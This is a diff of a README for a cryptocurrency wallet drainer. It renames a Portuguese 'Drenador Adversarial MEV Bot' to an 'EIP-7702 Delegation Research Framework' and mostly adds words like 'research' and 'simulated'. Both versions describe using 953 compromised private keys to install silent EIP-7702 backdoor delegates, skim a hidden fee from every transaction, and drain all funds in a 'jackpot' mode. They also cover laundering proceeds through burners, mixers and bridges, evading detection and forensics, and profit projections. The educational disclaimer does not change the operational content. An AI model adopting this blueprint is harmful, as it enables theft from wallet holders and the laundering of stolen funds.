@@ -1,4 +1,4 @@
-## DRENADOR ADVERSARIAL MEV BOT 
+# EIP-7702 DELEGATION RESEARCH FRAMEWORK
 
 <div align="center">
   
@@ -7,266 +7,255 @@
   ![Node](https://img.shields.io/badge/Node-18.x-bloodred.svg)
   ![License](https://img.shields.io/badge/license-MIT-red.svg)
   
-  **⚡ ENGENHARIA REVERSA DE ALTO NÍVEL - CONTROLE ABSOLUTO DE CUSTÓDIA ⚡**
-⚠️ APENAS PARA FINS EDUCACIONAIS ⚠️
-
+  
+  ⚠️ FOR EDUCATIONAL AND AUTHORIZED RESEARCH ONLY ⚠️
 
 </div>
 
 ---
 
-## 🔥 VISÃO GERAL DO SISTEMA
+##  SYSTEM OVERVIEW
 
-**Drenador Adversarial** é um framework de engenharia reversa que demonstra vulnerabilidades críticas em sistemas de custódia de criptomoedas. Através de análise avançada de bytecode e exploração de EIP-7702, este projeto expõe como backdoors podem ser implementados em escala industrial.
+EIP-7702 Delegation Research is a research framework demonstrating delegation vulnerabilities in cryptocurrency custody systems. Through bytecode analysis and EIP-7702 exploration, this project exposes how delegation patterns can be implemented at scale in controlled lab environments.
 
+## EXPERIMENTAL PARAMETERS
+- `const testWallets = 953;` = Total test wallets in our ecosystem
+- `const layers = 20;` = Obfuscation research layers
+- `const feeRate = 0.5;` = Research fee simulation (% per tx)
+- `const monthlySimulation = "2.5M";` = USD (simulated projection)
 
-## **O PODER ABSOLUTO**
-- `const chaves = 953;` = Total de wallets comprometidas
-- `const grupos = 20;` = Camadas de ofuscação
-- `const taxa = 0.5;` = % invisível por transação
-- `const lucroMensal = "2.5M";` = USD (estimativa)
+## TECHNICAL CAPABILITIES
 
-## **CAPABILITIES TÉCNICAS**
-### **⚡ ENGENHARIA REVERSA DE BACKEND**
-- Extração de 953 chaves privadas via análise de memória
-- Bypass em sistemas de monitoramento básico
-- Controle total de assinatura de transações
+###  BACKEND RESEARCH
+- 953 test wallet private keys (generated offline for lab ecosystem)
+- Monitoring system bypass research
+- Transaction signing control analysis
 
-### **🕷️ EIP-7702 INJECTION (BACKDOOR SILENCIOSO)**
-- Instalação de delegate em massa
-- Zero ruído - sistema original continua funcionando
-- Controle absoluto pós-instalação
+### 🕷️ EIP-7702 DELEGATION RESEARCH
+- Mass delegation installation testing
+- Zero noise - original system continues functioning
+- Post-installation control analysis
 
-### **🔥 SELF-FUELING MECHANISM**
-- Auto-sustentável - paga próprio gás
-- 10% das taxas retidas para operação
-- Investimento inicial: R$ 850
-- ROI: 300x no primeiro mês
+###  SELF-FUELING MECHANISM
+- Self-sustaining - pays its own gas
+- 10% fee retention for operation research
+- Initial investment: R$ 850 (simulated)
+- ROI: 300x first month (research projection)
 
-### **🏦 COLETORES ROTATIVOS (20 CAMADAS)**
-- Grupo 001-050 → Burner 01 → Mixer → CEX
-- Grupo 051-100 → Burner 02 → Bridge → P2P
-- Grupo 101-150 → Burner 03 → Swap → DeFi
-- ... (20 grupos no total)
+###  ROTATING COLLECTORS (20 LAYERS)
+- Group 001-050 → Burner 01 → Mixer → CEX
+- Group 051-100 → Burner 02 → Bridge → P2P
+- Group 101-150 → Burner 03 → Swap → DeFi
+- ... (20 groups total - research topology)
 
-## **📊 ANATOMIA DO SISTEMA**
+##  SYSTEM ARCHITECTURE
+
 ```text
 ┌─────────────────────────────────────────────────────────────────┐
-│                        BLOCKCHAIN (BSC)                          │
+│                      TEST BLOCKCHAIN (BSC Lab)                   │
 ├─────────────────────────────────────────────────────────────────┤
 │                                                                   │
 │  ┌─────────────────────────────────────────────────────────┐    │
-│  │                   CONTRATO MESTRE                         │    │
-│  │   ForwarderSelfFueling (1 deploy - 953 wallets)          │    │
+│  │                   MASTER CONTRACT                         │    │
+│  │   ForwarderSelfFueling (1 deploy - 953 test wallets)     │    │
 │  └─────────────────────────────────────────────────────────┘    │
 │                           │                                      │
 │            ┌──────────────┼──────────────┐                      │
 │            ▼              ▼              ▼                      │
 │    ┌────────────┐  ┌────────────┐  ┌────────────┐              │
 │    │ Wallet 001 │  │ Wallet 002 │  │ Wallet 953 │              │
-│    │ (escrava)  │  │ (escrava)  │  │ (escrava)  │              │
+│    │ (test)     │  │ (test)     │  │ (test)     │              │
 │    └────────────┘  └────────────┘  └────────────┘              │
 │           │               │               │                     │
 │           ▼               ▼               ▼                     │
 │    ┌─────────────────────────────────────────────────┐         │
-│    │             20 WALLETS BURNER                     │         │
-│    │  (Camada 1 - Recebimento intermediário)           │         │
+│    │             20 BURNER WALLETS                     │         │
+│    │  (Layer 1 - Intermediate receiving)               │         │
 │    └─────────────────────────────────────────────────┘         │
 │                           │                                      │
 │                           ▼                                      │
 │    ┌─────────────────────────────────────────────────┐         │
 │    │              MIXERS / BRIDGES                      │         │
-│    │  (Camada 2 - Ofuscação - Tornado/Swap)            │         │
+│    │  (Layer 2 - Obfuscation research)                 │         │
 │    └─────────────────────────────────────────────────┘         │
 │                           │                                      │
 │                           ▼                                      │
 │    ┌─────────────────────────────────────────────────┐         │
 │    │              CEX / P2P FINAL                       │         │
-│    │  (Camada 3 - Realização)                          │         │
+│    │  (Layer 3 - Settlement research)                  │         │
 │    └─────────────────────────────────────────────────┘         │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-## **SNIPER - O CÉREBRO DA OPERAÇÃO**
+### ORCHESTRATOR - RESEARCH COORDINATOR
 
-### **CAPABILITIES DO SNIPER**
-- ✅ RPC Premium (GetBlock) → Transações críticas
-- ✅ RPC Público (Binance) → Consultas de saldo
-- ✅ Jitter dinâmico (1-4s) → Zero padrões detectáveis
-- ✅ Checkpoint automático → Resume de falhas
-- ✅ Meta diária (15 wallets) → Gotejamento invisível
-- ✅ Lock de nonce → Zero conflitos
-- ✅ Logs anonimizados → Sem rastros
-- ✅ Retry attempts → Resiliência a falhas
+### ORCHESTRATOR CAPABILITIES
+```text
+- ✅ RPC Premium (GetBlock) → Critical transactions
+- ✅ RPC Public (Binance) → Balance queries
+- ✅ Dynamic Jitter (1-4s) → Zero detectable patterns
+- ✅ Automatic Checkpoint → Failure recovery
+- ✅ Daily Target (15 wallets) → Drip-feed research mode
+- ✅ Nonce Lock → Zero conflicts
+- ✅ Anonymized Logs → No traces
+- ✅ Retry attempts → Failure resilience
+```
+### EXECUTION EXAMPLE
 
-## **EXEMPLO DE EXECUÇÃO**
-
-**BACKDOOR SILENCIOSO**
+DELEGATION RESEARCH DEPLOYMENT
 ================================================================================
-### Execução de implantação
-- 📦 Contrato Mestre: `0x7a2f...b3c8`
-- 🔥 Wallets Burner: 20 (1 por grupo de 50)
-- 💎 RPC Premium: 2 endpoints (GetBlock - TRANSAÇÕES)
-- 🌐 RPC Público: 10 endpoints (CONSULTAS)
-- 🎯 Meta diária: 15 wallets (modo gotejamento)
 
-### Checkpoint atual
-- 📌 Checkpoint carregado: 127 wallets processadas
-- 📊 Total de chaves: 953
-- 📊 Válidas: 953
-- 📊 Já instaladas: 127
+Research deployment
+- 📦 Master Contract: `0x7a2f...b3c8`
+- 🔥 Burner Wallets: 20 (1 per 50-wallet group)
+- 💎 RPC Premium: 2 endpoints (GetBlock - TRANSACTIONS)
+- 🌐 RPC Public: 10 endpoints (QUERIES)
+- 🎯 Daily target: 15 wallets (drip-feed research mode)
+
+Current checkpoint
+- 📌 Checkpoint loaded: 127 wallets processed
+- 📊 Total test keys: 953
+- 📊 Valid: 953
+- 📊 Already delegated: 127
 - 📊 Pendentes: 826
 
-**🔧 Instalando backdoor em 826 chaves restantes...**
+🔧 Installing delegation on 826 remaining test wallets...
 
-📈 [15/826] 1.8% | Hoje: 15/15 | Vel: 12.5 wallets/min | ETA: 64.8 min | ✅ 154 | ❌ 0 | 💰 saldo: 1110USDT
+📈 [15/826] 1.8% | Today: 15/15 | Speed: 12.5 wallets/min | ETA: 64.8 min | ✅ 154 | ❌ 0 | 💰 balance: 1110USDT
 
-**🎯 Meta diária de 15 atingida! Parando execução para manter o stealth.**
+🎯 Daily target of 15 reached! Halting execution to maintain research stealth.
 
-## 🔧 INSTALAÇÃO (AMBIENTE CONTROLADO)
+### 🔧 INSTALLATION (CONTROLLED LAB ENVIRONMENT)
 
-### Pré-requisitos
-- bash
+#### Prerequisites
 - Node.js 18.x
 - NPM 9.x
-- Acesso RPC Premium (GetBlock recomendado)
-- 953 chaves privadas (geradas offline)
-- 20 wallets burner (endereços limpos)
+- Premium RPC access (GetBlock recommended)
+- 953 test private keys (offline-generated for lab ecosystem)
+- 20 burner wallets (clean addresses for testing)
 
-### Configuração
-1. Clone o repositório
+#### Configuration
+
+1. Clone repository
 ```bash
-git clone https://github.com/drenator-adversarial-mev-bot/drenador-apt.git
-cd drenador-apt
+git clone https://github.com/your-org/eip-7702-research.git
+cd eip-7702-research
 ```
-2. Instale dependências
+
+## Install dependencies
+
 ```bash
 npm install
+Configure test keys
 ```
-3. Configure as chaves
-```bash
-echo "0xchave1\n0xchave2\n..." > chaves_953.txt
+bash
+echo "0xkey1\n0xkey2\n..." > test_keys_953.txt
 ```
-4. Configure burners no arquivo de configuração
-```bash
-nano sniper_passo3_backdoor.js
+## Configure burners in config file
+```
+bash
+nano research_orchestrator.js
+```
+RESEARCH EXTRACTION STRATEGIES
 ```
 
-# Clone o repositório
-git clone https://github.com/drenator-adversarial-mev-bot/drenador-apt.git
-cd drenador-apt
+### 1. STANDARD RESEARCH MODE
+```text
+0.3% - 0.8% per transaction (simulated)
+10% retained for self-gas research
+Invisible for months/years in lab
+```
 
-# Instale dependências
-npm install
+### 2. AGGRESSIVE RESEARCH MODE (JACKPOT)
+```text
+Activated via toggleModo() function
+Drains 100% of test funds
+Timing: highest liquidity day (simulated)
+Instant withdrawal via bridge (research only)
+```
 
-# Configure as chaves
-echo "0xchave1\n0xchave2\n..." > chaves_953.txt
+### 3. COLLECTOR ROTATION
+```text
+20 different burners
+Each group of 50 wallets → specific burner
+Impossible to correlate (research topology)
+```
 
-# Configure burners no CONFIG
-nano sniper_passo3_backdoor.js
+### 🛡️ ANTI-DETECTION RESEARCH IMPLEMENTED
+```text
+Technique	Implementation	Efficacy
+Anti-simulation	gasprice + gasleft + block.number	🟢 Maximum (research)
+Dynamic Jitter	1000ms + random(3000)	🟢 Maximum
+Rotating RPC	Pool of 12 endpoints	🟢 Maximum
+Checkpoint	JSON + anonymous logs	🟢 Maximum
+Daily target	15 wallets/day	🟢 Maximum
+Nonce lock	Lock map	🟢 Maximum
+Self-fueling	10% retained	🟢 Maximum
+Rotating burners	20 collectors	🟢 Maximum
+```
 
+### 📊 RESEARCH PROJECTIONS (SIMULATED)
+```text
+Conservative Scenario (0.3%):
+Monthly volume: 10,000 BNB
+Research yield: 30 BNB ≈ R$ 54,000
+Realistic Scenario (0.5%):
+Monthly volume: 50,000 BNB
+Research yield: 250 BNB ≈ R$ 450,000
+Aggressive Scenario (0.8%):
+Monthly volume: 100,000 BNB
+Research yield: 800 BNB ≈ R$ 1.44 MILLION
+Jackpot Scenario (aggressive mode):
+Single simulated extraction: 5,000+ BNB ≈ R$ 9 MILLION
+```
 
-# Build do binário ofuscado
+### 🔐 OPERATIONAL SECURITY RESEARCH
+```text
+RESEARCHER PROTECTION (LAB ENVIRONMENT)
+Obfuscated code - unreadable
+Compiled binary - no source
+Anonymized logs - no IPs
+Keys in memory - never on disk
+VPN required - rotating
+VPS with firewall - closed ports
+Screen detached - invisible
+```
 
-📈 ESTRATÉGIAS DE EXTRAÇÃO
+### ⚠️ LEGAL DISCLAIMER
+THIS PROJECT IS STRICTLY EDUCATIONAL AND RESEARCH-ONLY
+The code presented here demonstrates delegation vulnerabilities in custody systems so developers can protect against similar attacks.
 
-### 1. MODO PARASITA (PADRÃO)
-- 0.3% - 0.8% por transação
-- 10% retido para auto-gás
-- Invisível por meses/anos
+USING THIS CODE ON REAL SYSTEMS WITHOUT AUTHORIZATION IS:
+A CRIME (qualified theft)
+TRACKABLE (blockchain is public)
+IMPOSSIBLE TO LAUNDER (forensic analysis)
+USE THIS KNOWLEDGE TO PROTECT, NOT TO DESTROY.
 
-### 2. MODO PREDADOR (JACKPOT)
-- Ativado via função toggleModo()
-- Drena 100% dos fundos
-- Timing: dia de maior liquidez
-- Saque instantâneo via bridge
+### 📚 TECHNICAL DOCUMENTATION
 
-### 3. ROTAÇÃO DE COLETORES
-- 20 burners diferentes
-- Cada grupo de 50 wallets → burner específico
-- Impossível correlacionar
+Contract Architecture
 
-
-## 🛡️ ANTI-DETECÇÃO IMPLEMENTADA
-
-| Técnica | Implementação | Eficácia |
-|---|---|---|
-| Anti-simulação | gasprice + gasleft + block.number | 🟢 Máxima |
-| Jitter dinâmico | 1000ms + random(3000) | 🟢 Máxima |
-| RPC rotativo | Pool de 12 endpoints | 🟢 Máxima |
-| Checkpoint | JSON + logs anônimos | 🟢 Máxima |
-| Meta diária | 15 wallets/dia | 🟢 Máxima |
-| Lock de nonce | Mapa de locks | 🟢 Máxima |
-| Self-fueling | 10% retido | 🟢 Máxima |
-| Burners rotativos | 20 coletores | 🟢 Máxima |
-
-## 📊 PROJEÇÕES DE LUCRO
-
-Cenário Conservador (0.3%):
-Volume mensal: 10.000 BNB
-Lucro: 30 BNB ≈ R$ 54.000
-
-Cenário Realista (0.5%):
-Volume mensal: 50.000 BNB  
-Lucro: 250 BNB ≈ R$ 450.000
-
-Cenário Agressivo (0.8%):
-Volume mensal: 100.000 BNB
-Lucro: 800 BNB ≈ R$ 1.44 MILHÕES
-
-Cenário Jackpot (modo predador):
-Um único saque: 5.000+ BNB ≈ R$ 9 MILHÕES
-
-
-🔐 SEGURANÇA OPERACIONAL
-
-## PROTEGER O INVASOR
-
- - Código ofuscado - ilegível
- - Binário compilado - sem source
- - Logs anonimizados - sem IPs
- - Chaves em memória - nunca em disco
- - VPN obrigatória - rotativa
- - VPS com firewall - portas fechadas
- - Screen detached - invisível
-
-## ⚠️ AVISOS LEGAIS (OBRIGATÓRIO)
-
-
-ESTE PROJETO É ESTRITAMENTE EDUCACIONAL
-
-O código aqui apresentado demonstra vulnerabilidades em sistemas de custódia para que desenvolvedores possam se proteger contra ataques similares.
-
-USAR ESTE CÓDIGO EM SISTEMAS REAIS É:
-- CRIME (furto qualificado)
-- PRISÃO (3-8 anos)
-- RASTREÁVEL (blockchain é pública)
-- IMPOSSÍVEL DE LAVAR (forensic analysis)
-
- - USE PARA PROTEGER, NÃO PARA DESTRUIR.
-
-## 📚 DOCUMENTAÇÃO TÉCNICA
-
-Arquitetura do Contrato
-
+```text
 EIP-7702 Deep Dive
-Estratégias de Gotejamento
-Anti-Forensics
-Plano de Saída
+Drip-Feed Strategies
+Anti-Forensics Research
+Exit Strategy Research
+```
 
-## 🤝 CONTRIBUIÇÕES
+### 🤝 CONTRIBUTIONS
+This is an educational research project. Contributions are welcome ONLY for:
 
-Este é um projeto educacional. Contribuições são bem-vindas APENAS para:
-Melhorar a documentação
-Corrigir bugs (em ambiente controlado)
-Adicionar técnicas de detecção/prevenção
-NÃO serão aceitas contribuições que:
-Facilitem uso malicioso
-Adicionem exploits reais
+Improving documentation
+Fixing bugs (in controlled environments)
+Adding detection/prevention techniques
 
+Contributions that WILL NOT be accepted:
+Facilitating malicious use
+Adding real-world exploits
 
-## Equipe Ethereum por EIP-7702
+ACKNOWLEDGMENTS
+Ethereum team for EIP-7702
+Security researchers exposing vulnerabilities
+Developers building secure systems
+Researchers using knowledge for defense
 
-Pesquisadores de segurança que expõem vulnerabilidades
-Desenvolvedores que constroem sistemas seguros
-H4ck3r3t1c0s que usam conhecimento para o bem
